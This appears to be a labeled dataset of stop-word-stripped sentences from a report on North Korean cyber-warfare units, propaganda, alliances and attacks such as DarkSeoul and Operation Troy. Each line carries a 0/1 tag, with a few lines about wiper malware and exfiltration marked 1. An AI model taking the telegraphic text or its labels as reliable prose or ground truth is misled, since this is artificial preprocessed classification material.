Unit 35 reportedly responsible technical education training cyber warriors	0
The Unification Bureau 's Operations Department responsible cyber-psychological warfare organizational espionage oversight Unit 204	0
Unit 204 's responsibilities include planning execution cyber-psychological warfare operations technological research	0
The Psychological Operations Department North Korea Defense Commission also engages cyber-psychological warfare	0
The 225th Bureau Office 225 responsible training agents infiltration operations South Korea creation underground political parties order incite disorder revolution	0
It plays traditional intelligence psychological operations role rather focusing cyber operations	0
The United Front Department ( UFD ) conducts overt operations create pro-North Korean groups South Korea	0
Examples activity include Korean Asia-Pacific Committee Ethnic Reconciliation Council	0
The UFD also manages inter-Korean dialogue North Korea's policy toward South Korea	0
Its operations also traditional rather cyber-focused	0
The Liaison Department Worker 's Party oversees faction ethnic North Koreans residing Japan critical North Korea 's cyber intelligence programs	0
This group established 1955 referred various names including Chosen Soren Chongryon General Association Korean Residents Japan	0
The Chongryon ascribe juche seek preserve North Korean culture living Japan	0
They operate North Korean style schools refuse assimilate Japanese culture	0
According Mitsuhiro Suganuma former section head second intelligence department Japanese Public Security Intelligence Agency ( PSIA ) '' Chongryon virtually direct control Liaison Department Workers ' Party Korea charge North Korea 's covert operations underground activities South Korea	0
Chongryon Japan strong support organization aimed bringing revolution South Korea red unification force	0
'' He also stated '' North Korea continue make Chongryon serve Pyongyang 's pawn covert operations South Korea	0
'' The Chongryon vital North Korea 's military budget raising funds via weapons trafficking drug trafficking black market activities	0
The group also forms '' front companies '' abroad benefit regime generating hard currency	0
One example Unikotech formed sell KCC products abroad	0
The Chongryon 's underground group known Gakushu-gumi '' study group '' gathers intelligence North Korea helps regime procure advanced technologies	0
The Chongryon 's role North Korean intelligence resource acquisition discussed detail	0
The regime also several government bodies Cabinet oversee infrastructure intelligence technological development	0
These include Central Scientific Technological Information Agency ( CSTIA ) Ministry Electronics Industry Ministry Posts Telecommunications	0
The CSTIA collects analyzes processes data regarding advanced science technology sends relevant information appropriate areas national economy	0
The amount information contained CSTIA's technical database makes North Korea 's largest scientific facility	0
According CIA article review CSTIA 's publications showed China Russia Japan important sources technical data	0
CSTIA 's publications include newsletters 18-volume science technology reference series	0
The Ministry Posts Telecommunications body oversight Star Joint Venture Co. North Korea 's cyber warfare doctrine clearly stated	0
However based cultural technical observations may deduce North Korea 's cyber doctrine follows tenets juche nationalism songun doctrine	0
Although North Korea 's limited online presence makes thorough analysis cyber warfare capabilities difficult task must noted known capabilities closely mirrors kinetic warfare tactics	0
Cyber warfare simply modern chapter North Korea's long history asymmetrical warfare	0
North Korea used various unconventional tactics past guerilla warfare strategic use terrain psychological operations	0
The regime also aspires create viable nuclear weapons	0
Asymmetrical warfare defined '' conflict resources two belligerents differ essence struggle interact attempt exploit 's characteristic weaknesses	0
Such struggles often involve strategies tactics unconventional warfare 'weaker ' combatants attempting use strategy offset deficiencies quantity quality ''	0
According aforementioned report House Armed Service Committee '' Cyber warfare important asymmetric dimension conflict North Korea probably continue emphasize - part deniability low relative costs	0
'' North Korea 's poor economic state explains regime 's reliance tactics	0
In 2014 regime reportedly spent 16 % budget defense	0
The North Korean military places strong emphasis information warfare capabilities including political psychological warfare cyber hacker warfare	0
The report Capt	0
Duk-Ki Kim Ph.D. highlighted North Korea 's counter-asymmetric strategy ranked based intensity frequency Just ten years ago experts noted North Korea one '' least network-ready isolated societies planet	0
'' Today North Korea 's air-gapped networks prioritization resources military use provide secure structured base operations cyber operations secure means communications	0
North Korea 's hermit infrastructure creates cyber-terrain deters reconnaissance	0
Because North Korea Internet connections outside world anyone seeking intelligence North Korea 's networks expend resources cyber reconnaissance	0
A 2003 article U.S. Office National Counterintelligence Executive assessed '' Development nation rather empowerment individual appears driving DPRK efforts develop domestic IT infrastructure industry	0
'' In November 2013 Kim Jong Un referred cyber warfare capabilities '' magic weapon '' conjunction nuclear weapons missiles	0
According Kim Heung-kwang North Korean defector former computer science professor regime following motivations expanding cyber warfare capabilities  Cyber capabilities cost-effective way offset North Korea 's lack kinetic military prowess	0
 North Korea 's school systems place strong emphasis math giving nation confidence programmers cryptographers security researchers	0
 In modern warfare landscape cyber capabilities potentially utilitarian heavy artillery aircraft	0
 Cyber warfare capabilities provide platform espionage psychological operations forms non-kinetic warfare	0
 Considering separatist nature North Korea 's infrastructure cyber warfare provides strategic advantage since outbound attacks possible inbound attacks would limited reach	0
 Cyber warfare allows North Korea leverage Internet 's inherent flaws offensive purposes maintaining defenses primarily via air-gapping critical networks outside world	0
North Korea 's attack defense capabilities reportedly include following cyber warfare electronic warfare components offensive cyber operations ( OCO ) ; computer network operations ( CNO ) includes computer network attack ( CNA ) computer network exploitation ( CNE ) ; distributed denial service ( DDoS ) ; satellite monitoring ; drones ; GPS jamming capabilities ; deployment electromagnetic pulse ( EMP )	0
North Korea 's OCO CNO capabilities became apparent early 2004 North Korea reportedly gained access 33 80 South Korean military wireless communication networks	0
In June 2006 attack U.S. State Department originating East Asia-Pacific region coincided U.S.-North Korea negotiations regime 's nuclear missile testing	0
A month later South Korean military report implicated North Korea 's Unit 121 hacking South Korean U.S. Defense Departments	0
North Korea also tested logic bomb October 2007	0
A logic bomb malicious code programmed execute based pre-defined triggering event	0
Following logic bomb test UN passed resolution banning sales certain computer hardware North Korea	0
North Korea considers cyber warfare capabilities important asymmetric asset face perceived enemies U.S. South Korea	0
While North Korea immersive digital culture U.S. South Korea heavily dependent upon technological infrastructure social economic political stability	0
For reason cyber attack cripples compromises reliability U.S. South Korea 's technological infrastructure could far-reaching impact	0
North Korea reportedly used computer games illegal capital gain orchestrating cyber attacks	0
In 2011 South Korean police arrested five individuals including one Chinese national allegedly collaborating North Korean hackers affiliated Korea Computer Center steal money via online games	0
According South Korean reports culprits used auto-player quickly progress massively multiplayer online role-playing game ( MMORPG ) '' Lineage '' able use game 's market obtain real currency	0
In 2013 South Korean officials released information stating found evidence North Korea using games medium infecting machines launching cyber attacks	0
North Korea used game downloads infect 100,000 South Korean machines botnet used launch distributed denial service ( DDoS ) attack Incheon Airport	0
This clever tactic sought leverage seemingly innocent game force multiplier order amplify effects DDoS attack critical infrastructure target	0
However case little impact target	0
North Korea 's intelligence program one strongest military assets providing foundational support military operations	0
The regime 's cyber warfare capabilities particular rely heavily open-source intelligence ( OSINT ) collection cyber-espionage	0
As noted CIA publication '' It significant irony information age open-source intelligence contributing survival development one world 's secretive regimes	0
'' Historically primary goals regime 's intelligence program included collection dissemination intelligence concerning possible political military economic threat regime 's security stability	0
Secondary goals included '' acquisition foreign military civilian technologies equipment support DPRK 's foreign policy goals training support foreign revolutionary terrorist organizations acquisition foreign capital state intelligence operations	0
'' North Korea broad reach intelligence collection extends cyber intelligence	0
In April 2013 Solutionary company providing managed security services reported marked increase overt attacks information gathering attempts originating North Korean IPs	0
Solutionary refers overt external attacks company networks attempts steal data '' touches	0
'' They reportedly recorded 12,473 touches February 2013 11,000 directed single financial institution	0
As baseline Solutionary noted typically 200 incidents per month traced North Korean origin	0
This interesting claim considering attacks attributed North Korea usually routed countries	0
As mentioned faction ethnic North Koreans residing Japan known Chongryon critical North Korea 's cyber intelligence programs help generate hard currency regime	0
The Chongryon headquarters recognized de facto North Korean embassy Japan	0
In 2012 organization 's headquarters seized pay group's past due debts	0
It purchased monk named Ekan Ikeguchi let Chongryon continue use building referred '' goodwill gesture ''	0
Ikeguchi one Chongryon's many ties organized crime	0
Ikeguchi arrested past attempted coup Japanese government	0
He also ties political group Nihon Seinensya involved illegal activities conjunction yakuza syndicate Sumiyoshi-kai imports sells amphetamines made North Korea	0
North Korea also black market ties Sumiyoshi-kai's rival syndicate Yamaguchi-gumi	0
Many members Kodo-kai Yamaguchi-gumi 's ruling faction Korean-Japanese ties North Korea	0
Masahiro Namikawa leader drug trafficking Seido-kai yakuza organization also ties Chongryon	0
The Chongryon operate least two websites chongryon.com Japanese korea- np.co.jp	0
WHOIS records chongryon.com indicate registered '' guanin '' using email address park2 @ mac.com	0
The WHOIS information korea-np.co.jp	0
shows registered Choson Shinbo Company Inc	0
The WHOIS records sites found Appendix A. Additionally Chongryon operate ferry called Mangyongbong-92 direct transit Japan North Korea	0
In 2003 suspected using ferry smuggle missile parts	0
In 2006 ferry temporarily banned Japanese waters Japanese officials discovered Chongryon using smuggle dual-use electronics North Korea used military purposes	0
North Korea global network state-run businesses located 30 40 countries used espionage activities	0
The Reconnaissance General Bureau responsible oversight network	0
The businesses include cafes non-suspect establishments	0
The highest concentration China	0
Members espionage network reportedly '' send $ 100 million cash per year regime provide cover spies	0
'' These establishments also used money laundering drug trafficking	0
The regime also known kidnap foreign citizens use instruments intelligence	0
Prisoners first tortured psychologically conditioned bend regime 's	0
They used based skillset	0
This may include teaching language North Koreans spreading propaganda native language providing translation services conducting military training skills regime deems useful	0
In July 2014 Japanese officials agreed lift sanctions North Korea regime agreed investigate whereabouts Japanese citizens allegedly abducted North Korean agents decades ago	0
Sanctions lifted include ban port calls Japan North Korean ships	0
North Korea also infiltrated important positions South Korea intelligence psychological operations purposes	0
In 2011 South Korea 's National Intelligence Service reportedly discovered presence Communist spies	0
These spies within trusted circles reporting back North Korea almost 10 years	0
The embedded spies included Democratic Party representative	0
According agency spies mission infiltrate influence Democratic Party gather military intelligence	0
The regime also attempts infiltrate organizations made North Koreans seek shelter South Korea order gain intelligence	0
In past several years South Korea arrested least 14 defectors found spies	0
These intelligence collection counterintelligence capabilities attempt provide regime strategic asymmetrical advantage	0
The regime leverages human cyber resources around globe provide influx intelligence little credible intelligence regime 's activities capabilities ever becomes available outside world	0
North Korea continues master propaganda deception leverages cyber realm psychological operations	0
Modern North Korean psychological operations tactics include distribution propaganda via traditional media outlets websites social media	0
Many psychological operations campaigns politically focused	0
According Dr. Andrei Lankov North Korean government '' rational highly successful manipulators usually get want outsmarting everybody else process	0
'' The regime 's Unit 204 responsible cyber-psychological operations	0
These operations PSYOP tailored cyber arena	0
In order successful cyber- psychological campaigns require speed precision creativity	0
These campaigns leverage phenomenon viral unverified news stories tend rapidly propagate via social media mobile text messaging electronic communications	0
This phenomenon creates arena strategic propagation fact fiction purposes sentiment manipulation	0
Such messages may used recruitment cyber mobilization instill fear target population	0
Cyber-psychological operations may also include mental suggestion using technology delivery mechanism subliminal cues	0
It unknown whether North Korea possesses capability	0
North Korean citizens access state-approved social networks Kwangmyong	0
The regime limited overt social media presence Internet	0
Some known social media platforms employed regime include Twitter Facebook YouTube	0
The YouTube channel North Korea Today operated user rodrigorojo1 features news clips North Korea	0
It unclear whether channel officially sanctioned	0
The North Korea Today YouTube channel also corresponding profiles Twitter Facebook	0
The Uriminzokkiri website known pushing juche ideology anti-American anti-South Korean messages accompanying social media profiles YouTube Google+ Facebook	0
It also Twitter profiles Korean English	0
North Korean propaganda used several purposes enforce ideals allies sympathizers frame North Korea favorable light outsiders sensationalize regime 's perceived self-reliance military prowess shield citizens outside world	0
Juche ideology indoctrination regime's youth ensure support local population	0
North Koreans accept military duty honor strive excel service regime	0
In spirit juche regime uses disinformation '' hide lapses tout accomplishments may never achieved	0
'' Limiting citizen access outside world instituting Kwangmyong intranet North Korea ensures citizens exposed outside information counterproductive citizen indoctrination conflict juche ideals	0
North Korea portrays West particularly United States enemy	0
The regime uses strategy shifting population's negative sentiments toward external entity keep citizens ignorant North Korea 's economic hardship regime brutality systemic incompetence	0
For example prior Kim Jong Il 's death 2011 North Korean media altered photos '' Dear Leader '' make appear younger healthier really	0
This became obvious altered photos compared taken Western media around time	0
According Dr. Andrei Lankov '' North Koreans much better understanding going outside	0
This largely thanks spread DVDs video content country also China talk seen…many [ ] sincerely believe United States remains ready attack moment Japan incurably aggressive place…nearly swallow official propaganda myths Korean War started 'American Imperialists' invaded	0
Hence see outside world inherently dangerous place	0
'' Some human rights groups seek reach North Korean citizens break isolation	0
In August 2014 New York-based charity Human Rights Foundation sponsored hackathon San Francisco called '' Hack North Korea '' find new ways get information around North Korea	0
The event brought together many programmers human rights campaigners defectors	0
North Korea even uses '' trolling '' PSYOP tactic	0
On Internet '' trolls '' users post messages often crass controversial inflammatory offensive order evoke strong reaction influence reader 's opinion	0
Often motivation trolling simply troll 's enjoyment	0
The rude offensive trolling tactics stark contrast traditional forms persuasive rhetoric	0
However North Korea reportedly utilizes 200 military intelligence operatives troll South Korean message boards social media pages pro-North Korean sentiments. /fn Matt Rhoades director cyberspace security program Truman National Security Project said '' North Korea 's cyber-development almost new harassment mechanism low-cost asymmetric method harass neighbor south… '' Leveraging cyber intelligence resources noted North Korea 's psychological operations serve important strategic role	0
The ability influence outsiders effectively isolating population outside influence allows North Korea remain enigma	0
Additionally line PSYOP tactics North Korea may strategically take credit cyber attacks reality launched another entity	0
Whether targeted entity blames North Korea attacks regime simply takes credit attack yet attributed several PSYOP goals come play	0
First claim credit attack amplifies impact show force particularly South Korea target	0
This tactic used stir sentiments order provoke reaction	0
Second North Korea may lay claim responsibility attack exceeds capabilities order seem technologically advanced capable	0
Third success appearance thereof enforces juche ideal regime self-sufficiency	0
Finally North Korea may act scapegoat claim credit cyber attack ally China attack attributed real actors	0
North Korea reportedly electronic warfare capabilities jam GPS inject false GPS coordinates	0
North Korea demonstrated capabilities March 2011 jamming South Korea 's GPS signals joint U.S.-South Korea military exercise	0
North Korea capability create EMP	0
An EMP sudden extreme outburst atmospheric electricity creating intense magnetic field burn electrical equipment	0
A report U.S. Department Homeland Security ( DHS ) noted North Korea 's ability deliver nuclear warhead satellite South Pole effectively creating burst needed deliver EMP targeting United States	0
An EMP could effectively disrupt electronic communications including critical infrastructure components telecommunications financial institutions energy sector transportation food water delivery emergency services space systems	0
North Korea reportedly acquired EMP technology Russia	0
North Korea also drone program	0
The regime reportedly acquired first drones late 1980 's early 1990 's	0
The regime 's drones complimentary intelligence program primarily used surveillance	0
In early 2014 North Korean drone crashed south 38th parallel line dividing North Korea south	0
While early reports noted drones appeared similar manufactured Chinese company Tauyuan Navigation Friend Aviation Technology company denied involvement	0
Stressing importance regime 's electronic warfare capabilities 1999 former regime leader Kim Jong Il said '' The basic key victory modern warfare well electronic warfare	0
'' Since regime 's advanced technology lags behind South Korea U.S. capability disrupt communications perceived adversaries vital asymmetric capability	0
North Korea utilizes primary secondary education university system train cyber warfare operators	0
According reports defectors regime seeks children show mathematical talent sends rigorous advanced training	0
A vintage North Korean animation stresses importance mathematics North Korean education	0
The short film follows young boy geometry homework	0
The frustrated boy begins daydream visions going war U.S. needing geometry effectively calculate missile trajectory battle	0
Science technology students expected learn foreign languages may include Chinese Japanese English.233 Student emails chats web browsing activities heavily monitored	0
Around age twelve thirteen chosen students enrolled accelerated computer courses First Second Geumseong Senior-Middle Schools	0
The successful students sent Kim Il-sung University Kim Chaek University Technology Command Automation University traditionally known Mirim University	0
Kim Il-sung University 's computer center started 1985	0
Its computer courses heavy programming element	0
The university reportedly developed Intelligent Locker hard disc protection program Worluf Antivirus SIMNA ( simulation system analysis program ) war games program hepatitis diagnosis prescription system C++ program development tool called FC 2.0	0
Kim Il-sung University also programs focusing nuclear research	0
Kim Chaek University Technology established 1948	0
In late 1990s began restructure computer-focused courses reflect modern technologies	0
As 2002 university three colleges focusing computer science information science technology machine science	0
Software developed university includes Computer Fax SGVision image-reprocessing program used steganography	0
Students instructors must submit formal request permission order use Internet research	0
The Command Automation University periodically chooses around 100 students intensive five-year course prior assignment serve cyber intelligence cyber warfare capacities	0
Programs Command Automation University include command automation computers programming automated reconnaissance electronic warfare	0
Other students attend two-year accelerated university program study abroad Russia China assigned cyber-operator role	0
The elite cyber operators given special incentives	0
For example parents students graduating cyber program top scores given opportunity live Pyongyang ; married cyber operators given housing food allowance stipend operating overseas	0
Due nature profession cyber elite North Koreans allowed access outside Internet	0
While report focuses North Korea 's cyber warfare capabilities capabilities fully separated implications partnerships countries known deal illegal weapons trade regime	0
Now cyberspace become legitimate arena warfare nations also potential allies cyber realm	0
For reason regime 's key political military relationships explored	0
North Korea longstanding historical relationship China	0
During Korean War ( 1950- 1953 ) China allied North Korea 's Communist forces	0
China also provided ongoing political economic support regime 's leadership primary trade partner	0
North Korea economically dependent China	0
North Korea gets estimated 90 percent energy imports 80 percent consumer goods 45 percent food supply China	0
This relationship prudent – event military conflict China strategically use North Korea buffer zone South Korea many U.S. military personnel stationed	0
Chinese aid North Korea also deters likelihood regime collapse resulting internal destabilization could catalyze U.S.-China conflict	0
North Korea relies heavily China technological resources	0
As noted North Korea relies China 's Unicom Internet access	0
Additionally regime sends cyber warriors train China stations portion Unit 121 personnel Shenyang	0
Some North Korea 's official websites hosted China KCC branch office	0
North Korea also relies China provide much network hardware including servers routers	0
North Korea long history ties Russia	0
The former Soviet Union major sponsor North Korean state major trading partner	0
Following dissolution Soviet Union aid North Korea halted trade diminished significantly	0
This chain events contributed North Korea 's eventual economic collapse could survive without aid	0
North Korea currently collaborative relationship Russia cyber realm	0
The regime's CSTIA relies Russia one several sources technical data	0
North Korea also sends cyber warriors train Russia regime reportedly acquired EMP technology	0
Political ties Russia North Korea become stronger recent months	0
In 2014 potentially result U.S. response Russian-Ukranian conflict Russia began strengthen ties North Korea	0
Negotiations reportedly included promises trade development projects	0
Narushige Michishita North Korea Asia security expert Japan's National Graduate Institute Policy Studies stated '' By strengthening relationship North Korea Russia trying enhance bargaining position vis-à-vis United States Japan	0
'' Russia also recently forgave regime 's debts	0
North Korea Iran longstanding political military ties	0
North Korea supplied Iran conventional arms Iran-Iraq War	0
Iran North Korea reportedly collaborate closely ballistic missile development efforts	0
In past Iran provided North Korean regime necessary funds oil exchange missile parts technology	0
In 2009 North Korean plane transporting 35 tons weapons allegedly bound Iran seized making unscheduled stop Bangkok Thailand	0
That year United Arab Emirates seized ship bound Iran transporting several containers North Korean weapons including rocket-propelled grenades ammunition	0
Reportedly customer company affiliated Iran 's Islamic Revolutionary Guard Corps	0
North Korea also cyberwar ties Iran	0
In 2012 North Korea Iran signed technology treaty help combat '' common enemies '' cyberspace	0
The treaty included provisions cooperation research student exchanges joint laboratories	0
Joint projects reportedly include IT information sharing engineering biotechnology renewable energy sustainability	0
F-Secure 's Mikko Hypponen stated '' It 's highly likely one reasons co-operation work together regarding cyber defence cyber offense strategies ''	0
Hypponen cited Flame malware possible triggering event creation treaty	0
Others also suspect Iran North Korea 's mutual interest development nuclear weapons need protect refineries malware Stuxnet driving factors establishment treaty	0
U.S. House Foreign Affairs Committee leaders assert treaty indicates North Korea Iran collaborating joint nuclear weapons program	0
Additionally North Korea conjunction Iran Syria reportedly supports Hamas Hezbollah procuring kinetic weaponry communications equipment establishing operational infrastructure	0
North Korea cyber relationship kinetic weapons ties Syria	0
KCC reportedly branch Syria	0
In 2007 Israel launched airstrike destroying Syrian target allegedly nuclear facility construction North Korea 's assistance	0
U.S. officials noted facility modeled North Korean nuclear reactor Yongbyon	0
The North Korea-Syria relationship becomes important context countries ' ties Iran	0
As noted Iran North Korea Syria jointly provide support extremist groups Hamas Hezbollah	0
Additionally explored HPSR Security Briefing Episode 11 Iran Syria 's military alliances extend joint SIGINT cyber operations	0
North Korea also interesting relationship Cuba – one includes supplying weapons apparent attempts illegally smuggle weapons	0
In 2013 North Korean cargo ship return voyage stopped near Panama Canal	0
The ship carrying surface-to-air missile parts disguised containers sugar	0
In attempt save face Cuba 's Ministry Foreign Affairs stated cargo included '' 240 metric tons obsolete defensive weapons -- two anti- aircraft missile complexes Volga Pechora nine missiles parts spares two Mig-21 Bis 15 motors type airplane manufactured mid-20th century -- repaired returned Cuba	0
'' Experts said cargo appeared include SNR-75 Fan Song fire-control radar system SA-2 missile Soviet-era missile system also used Cuba	0
Following incident Fidel Castro credited former North Korean leader Kim Il-Sung providing Cuba weapons near end Cold War	0
Weapons included 100,000 AK rifles necessary ammunition	0
While apparent cyber relationship exists North Korea Cuba time track record weapons trade means potential future collaboration cyber realm discounted	0
 North Korea gains access 33 South Korean military wireless communication networks  The U.S. State Department attacked entities East Asia-Pacific region	0
The attacks coincided State Department negotiations North Korea regarding regime 's nuclear missile tests	0
( June )  A South Korean military official states North Korea 's Unit 121 breached South Korean U.S. military entities	0
( July )  North Korea states '' fully ready form high-tech war	0
'' ( June )  DarkSeoul DDoS disk wiping malware targeting South Korean U.S. government media outlet financial websites	0
These attacks also coincided U.S	0
Independence Day	0
( July )  Malware '' Operation Troy '' likely planted	0
It interesting note much North Korea 's cyber activity follows distinct pattern	0
Analysis North Korean cyber activity gives insight patterns also helps tie together North Korea 's strategic tactical operational capabilities	0
Strategic capabilities refer assets used support long-term overarching goal	0
Tactical capabilities refer methods maneuvers actually implemented pursuit strategic goal	0
Operational capabilities refer potential use capabilities	0
In 2004 response annual U.S. – South Korea joint military exercises North Korea reportedly gained access 33 South Korean military wireless communication networks	0
The next significant cyber attack attributed North Korea June 2006	0
The U.S. State Department attacked entities East Asia-Pacific region	0
The attacks coincided State Department negotiations North Korea regarding regime 's nuclear missile tests	0
In July 2006 North Korea 's Unit 121 reportedly breached South Korean U.S. military entities	0
This attack concurrent regime 's test-fire least one long-range missile several medium-range missiles	0
2007 politically tumultuous North Korea	0
Following multi-national talks UN's International Atomic Energy Agency ( IAEA ) ordered shutdown regime 's nuclear facilities Yongbyon July	0
Its nuclear efforts temporarily thwarted North Korea tested logic bomb October 2007	0
In April 2009 North Korea ejected IAEA U.S. nuclear compliance officials	0
The regime indicated refusal comply UN agreements regarding nuclear weaponry announced would reinstate nuclear materials production	0
The next month North Korea conducted underground nuclear test voiced confidence regime well way producing viable nuclear technology	0
The UN called emergency meeting condemning nuclear weapons test South Korea joined Proliferation Security Initiative ( PSI )	0
North Korea issued statement via KCNA calling South Korea 's involvement PSI act war	0
In June 2009 North Korea stated '' fully ready form high-tech war	0
'' The following month DDoS disk wiping malware later known DarkSeoul targeted South Korean U.S. government entities media outlets financial websites	0
The attacks coincided U.S	0
Independence Day	0
Other malware used Operation Troy also planted	0
Operation Troy would continue several years largely undetected	0
In early 2011 political military tensions high	0
In February James Clapper United States Director National Intelligence testified North Korea likely undeclared uranium enrichment facilities part nuclear weapons program	0
In March 2011 South Korean media financial critical infrastructure targets suffered DDoS disk-wiping malware attack later known '' 10 Days Rain ''	0
U.S. South Korean military entities also targeted DDoS attack	0
The attack used DarkSeoul malware	0
North Korea also disrupted South Korean GPS signals	0
Additionally North Korean actors reportedly attempted DDoS attack South Korea 's Incheon Airport month	0
These incidents coincided annual U.S. – South Korea joint military exercises	0
The following month North Korean actors reportedly launched DDoS attack South Korea 's Nonghyup bank	0
In 2012 attack South Korean Newspaper JoongAng Ilbo attributed North Korean actors	0
This attack also coincided timing annual joint U.S. – South Korea military exercises	0
In September 2012 North Korea signed cyber treaty Iran agreeing two nations would collaborate combat '' common enemies '' cyberspace	0
The week March 11 2013 U.S. South Korea began annual joint military exercise near Korean Peninsula	0
Like clockwork attacks attributed North Korea known March 20 attacks targeted three South Korean media outlets Shinhan Nonghyup Jeju banks	0
North Korea also exhibited hostile activity time	0
North Korea cut communication Seoul announced scrapped 1953 armistice two Koreas	0
North Korea 's foreign ministry also issued statement perceived exercise precursor invasion regime would respond '' strong military counteraction '' situation escalated	0
That week North Korean military conducted drone attack simulation	0
On March 18 Uriminzokkiri YouTube channel posted anti-U.S. video entitled '' Firestorms Will Rain Headquarters War '' showed depiction White House crosshairs followed explosion	0
In May 2013 DarkSeoul malware used attack several South Korean financial institutions ; June DarkSeoul DDoS attacks launched South Korean government 's DNS server	1
The latter took place June 25 anniversary start Korean War	0
As evidenced much North Korea 's cyber activity coincides annual U.S. – South Korea joint military exercises	0
Attacks following pattern typically response political events impacting regime correlated significant dates anniversary start Korean War	0
The regime 's strategic assets tactical capabilities cyber arena seem evolved slightly since 2009	0
Most attacks attributed North Korea employ limited tactics operational capability demonstrates increase frequency volume attacks otherwise unimpressive date	0
In June 2014 regime demanded cancellation annual U.S. - South Korea joint military exercise attempting use participation upcoming Asian Games bargaining chip	0
The regime 's demands may political motivations preceded July 2014 meeting South Korean president Park Chinese President Xi Jinping	0
The meeting centered trade regional security issues including ever-present rhetoric around denuclearization North Korea	0
Both leaders critical Japan 's recent announcement soften sanctions North Korea	0
As report headed press annual U.S. – South Korea joint military exercises underway	0
The prominent North Korean threat actor group group responsible DarkSeoul malware	0
According statements South Korean government North Korea 's Lab 110 actors behind DarkSeoul malware	0
South Korean intelligence reports stated Lab 110 affiliated regime 's defense ministry ordered North Korean regime destroy South Korean communications networks	0
Although March 20 attacks used DarkSeoul malware interesting note two groups WhoIs Team New Romantic Cyber Army Team claimed responsibility '' March 20 '' 2013 attacks South Korean media financial institutions	0
Some DarkSeoul attacks corresponded significant dates U.S	0
Independence Day anniversary start Korean War	0
DarkSeoul attacks go beyond denial service sabotage	0
As early 2009 group responsible Dark Seoul attacks launched '' Operation Troy '' espionage campaign targeting South Korean military	0
The operation codenamed '' Troy '' due frequent use word '' Troy '' malware's compile path strings	0
The malware used attacks sought exfiltrated data based keyword searches	1
While malware clearly intended search exfiltrate certain types data true impact targets never revealed	1
The March 2011 '' 10 Days Rain '' DDoS attacks U.S. South Korean sites also attributed actors associated DarkSeoul	0
According Symantec politically motivated attacks required level intelligence coordination monetary support technical sophistication suggests state sponsorship	0
This designation means group considered advanced persistent threat ( APT )	0
A March 20 2013 attack attributed DarkSeoul actors targeted three South Korean media outlets Shinhan Nonghyup Jeju banks	0
The impact March 20 attacks included disruption service financial institutions data deletion	1
However targeted entities resumed normal operations shortly thereafter	0
According South Korean reports media outlets targeted corresponded listed North Korean regime 2012 right-wing press manipulated South Korea 's public opinion	0
In April 2012 regime reportedly listed entities attack targets	0
The malware used March 20 2013 attacks wiper malware	1
The malware attempted disable AhnLab Hauri AV antivirus products proceeded overwrite master boot record ( MBR )	1
The attack capable wiping Linux Windows machines	1
McAfee found attacks culmination malware campaign dubbed '' Operation Troy ''	0
A report IssueMakersLab tied actors responsible March 20 2013 attacks cyber attack activity occurring early 2007	0
IssueMakersLab found actors consistently used 16-digit password file compression stage 1 C2 protocol collection keywords encryption keys development path	1
According South Korea 's Korea Internet Security Agency North Korean IP address 175.45.178.xx found scanning South Korean routes month attacks IP reportedly logged accessing one targets 13 times	1
Details March 20 attack also suggested possible ties China	0
AlienVault suspected Chinese exploit kit GonDad used spread malware Korean domains serving malware registered using Chinese email address	1
Additionally researchers AhnLab South Korea noted Chinese IP address linked attacks	0
While concrete evidence released indicates Lab 110 responsible DarkSeoul attacks responsible group 's targets TTP attack timing demonstrate strong pro-North Korean sentiment	0
Known tactics techniques procedures Targets WhoIs Team one two groups claimed responsibility '' March 20 '' attacks targeting South Korea	0
A defacement LG +U webpage stated '' Hacked WhoIs Team '' attackers would return	0
The page featured three skulls	0
However attacks WhoIs Team observed	0
Known tactics techniques procedures Targets Associated actors Based North Korea 's affinity disinformation counterintelligence must note distinct possibility operatives claiming WhoIs Team part another group defacement false flag operation meant pin blame RAONASRT	0
RAONASRT South Korean white hat capture flag ( CTF ) team whose members also operate name '' WhoIs ''	0
l RAONASRT ( RaonSecure Advanced Security Research Team ) sub-teams WhoIs Team Cpark Team participated performed well CTF contests one hosted DefCon	0
In 2013 member RAONASRT invited Blue House residence South Korean president meet president Park discuss security industry	0
RAONASRT runs Secuinside CTF competition	0
Their parent organization RaonSecure operates whitehat training program	0
The group also runs Korea WhiteHat Contest hosted South Korea 's Ministry National Defense National Intelligence Service supervised South Korean Cyber Command	0
For reasons seems unlikely RAONASRT WhoIs Team would maliciously target South Korean entities	0
IsOne group claimed responsibility June 2012 attack website South Korean newspaper JoongAng Ilbo	0
The attack included attempt wipe JoongAng Ilbo 's servers well defacement depicting laughing cat	0
Despite efforts wipe target 's servers target suffered defacement temporary downtime	0
Although groups similar name use cat theme unclear whether CTF team known '' The Cat Number 1 '' IsOne actors	0
'' The Cat Number 1 '' members claim hail North Korea hard evidence linking team members region	0
Again seems actors responsible attack borrowed moniker another group	0
According South Korea 's National Police Agency attack JoongAng Ilbo shares characteristics previous attacks attributed North Korean actors	0
An investigation conducted agency 's Cyber Terror Response Center found actors targeting JoongAng Ilbo used two North Korean servers 17 servers 10 countries	0
One server maintained constant connection IP address belonging Joson Telecommunication Company affiliated North Korea 's Ministry Posts Telecommunications	0
Investigators found one servers used attack JoongAng Ilbo also used March 2011 DDoS attacks South Korean critical infrastructure sites April 2011 attack Nyongyup Bank	0
Known tactics techniques procedures Targets The Kimsuky malware targeted South Korean think tanks loosely attributed actor referred Kimsukyang	0
Little known actor group responsible malware	0
However following email addresses associated Kimsuky operation The email address iop110112 @ hotmail.com registered using alias '' kimsukyang '' rsh1213 @ hotmail.com registered using alias '' Kim asdfa ''	0
Kaspersky found Kimsuky operation used 10 IP addresses two Chinese provinces border North Korea Jilin Liaoning	0
Known tactics techniques procedures Targets The New Romantic Cyber Army Team also took credit March 20 2013 attacks	0
McAfee suspected New Romantic Cyber Army Team responsible Operation Troy resulting March 20 2013 attacks due group 's '' frequent use Roman classical terms code	0
'' It unknown whether Hastati alternate name group whether Hastati individual actor within group	0
It interesting note malware associated actors uses strings '' HASTATI '' '' PRINCIPES '' overwrite MBR	0
The name Hastati likely refers class infantrymen early Roman Republic	0
The Hastati less experienced soldiers fought frontlines spears swords	0
Principes likely refers experienced Roman soldiers fought second line battle	0
Known tactics techniques procedures Targets HP researchers previously analyzed samples DarkSeoul dropper findings published annual HP Cyber Risk Report 2013	0
Analysis malware included Appendix C. Analysis additional malware used campaigns produced new findings corroborated found external security researchers	0
These publicly available analyses cited throughout report	0
Some malware samples longer publicly available	0
However CrowdStrike obtained missing samples disappeared wild conducted thorough analysis released subscription-only reports	0
While divulge detailed information reports overview findings provided	0
The majority malware used cyber incidents attributed North Korea variations three types malware dropper wiper IRC remote access trojan ( RAT )	0
CrowdStrike's attribution malware North Korean actors stemmed two primary factors Korean language characters found binaries propensity specifically target South Korean entities	0
